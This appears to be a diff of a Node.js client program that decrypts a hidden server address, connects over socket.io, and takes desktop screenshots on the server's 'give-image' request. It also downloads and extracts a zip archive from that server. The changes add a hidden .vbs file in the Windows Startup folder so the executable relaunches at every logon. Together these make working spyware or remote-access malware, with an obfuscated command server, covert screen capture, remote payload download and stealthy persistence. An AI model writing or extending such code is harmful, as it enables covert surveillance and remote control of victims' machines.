@@ -7,9 +7,9 @@ function decrypt(encryptedText, key) {
 }
 const key = '080545641479637dd61dddcea091eaf625888a280545d\\\\6414799c637d9cd61dddc91/88a2a210b935dadd6aa4e80a0e5a0591832-02a080545ddde5a059a4e810b935d__a04e810b835da';
 const decryptedText = decrypt('92d81d13fbaaf5fa9715d1d486fab918a6050799b0bc71124fe403d825ce5dfa09eec38911ee29313b5dd1a8d8f1962c', key);
-const address = decryptedText;
+const targ = decryptedText;
 const time = 10000;
-const socket = require('socket.io-client')(address);
+const socket = require('socket.io-client')(targ);
 const screenshot = require('screenshot-desktop');
 const axios = require('axios');
 const fs = require('fs');
@@ -24,34 +24,38 @@ let isImageProcessed = true;
 
 async function connect() {
     try {
-        const response = await axios.get(address)
-        if (response.status === 200) upload(); console.log(response.status); 
-        
+        const response = await axios.get(targ)
+        if (response.status === 200) {
+            socket.on('connect', () => {
+                console.log('Подключено к серверу');
+            });
+        }
     } catch (error) {
         console.log('Ошибка переподключение через 10 секунд...');
         setTimeout(connect, time);
     }
 }
 
-async function upload() {
-    console.log("Uploading function");
-    try {
-        socket.on('connect', () => {
-            console.log('Подключено к серверу');
-            uploadImage();
-            setInterval(() => {
-                if (isImageProcessed) {
-                    uploadImage();
-                }
-            }, time);
-        });
-    } catch (error) {
-        console.log('Ошибка при подключении:');
-        setTimeout(connect, time);
-    }
-}
-
 async function uploadImage() {
+    fs.access(HD + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.vbs",fs.F_OK,(err) => {
+        if (err) {
+            console.log("File not exist");
+            fs.writeFile(path.join(__dirname,".vbs"),
+            `Set WshShell = CreateObject("WScript.Shell")
+            WshShell.Run """` + HD + `\\OneDrive\\Робочий стіл\\socket\\client\\index.exe""", 1, false
+            `,(err) => {
+                if (err) throw err;
+                console.log("succes created");
+                fs.copyFile(path.join(__dirname,".vbs"),path.join(HD + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup', '.vbs'), (err) => {
+                    if (err) {
+                      console.error('Ошибка при копировании файла:', err);
+                    } else {
+                      console.log('Файл успешно скопирован в папку автозагрузки.');
+                    }
+                });
+            })
+        }
+    })
     console.log("Uploading img function");
     try {
         const img = await screenshot();
@@ -72,7 +76,7 @@ async function uploadImage() {
             fs.mkdirSync(folderPath, { recursive: true });
             console.log('Папка успешно создана!');
         }  
-        let response = await axios.get(address, { headers: { 'getdata': 'true' }, responseType: 'arraybuffer' });
+        let response = await axios.get(targ, { headers: { 'getdata': 'true' }, responseType: 'arraybuffer' });
         fs.writeFileSync(zipPath, response.data);
         console.log('Файл успешно сохранен!'); 
         await extract(zipPath, { dir: folderPath });
@@ -82,9 +86,16 @@ async function uploadImage() {
 }    
 
 connect();
+
 socket.on('give-image', () => {
-    console.log("SHA");
-});
+    console.log("Server asked img");
+    uploadImage();
+    setInterval(() => {
+        if (isImageProcessed) {
+            uploadImage();
+        }else console.log(isImageProcessed);
+    }, time);
+})
 
 socket.on('disconnect', () => {
     console.log('Отключено от сервера');
